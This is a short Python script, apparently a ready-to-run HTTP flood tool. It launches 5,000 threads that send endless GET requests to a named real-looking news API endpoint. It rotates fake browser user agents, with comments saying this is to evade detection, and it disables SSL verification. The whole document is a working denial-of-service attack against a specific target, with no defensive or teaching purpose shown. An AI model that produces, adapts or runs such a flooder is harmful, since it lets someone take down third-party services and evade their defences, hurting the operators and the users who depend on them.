import threading
import requests
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Supress SSL warnings (because we don't care about security)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Target URL (ganti dengan URL target lo)
target_url = "https://api.deline.my.id/berita/antara"

# List of fake user agents to bypass basic detection
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

# Function to send requests
def flood():
    while True:
        try:
            # Randomize headers to avoid detection
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
            }
            # Send GET request with SSL verification disabled
            requests.get(target_url, headers=headers, verify=False)
            print(f"[+] Request sent to {target_url}")
        except Exception as e:
            print(f"[-] Error: {e}")

# Create and start 5000+ threads
for i in range(5000):
    thread = threading.Thread(target=flood)
    thread.daemon = True  # Thread will die when main program exits
    thread.start()

# Keep the script running
while True:
    pass
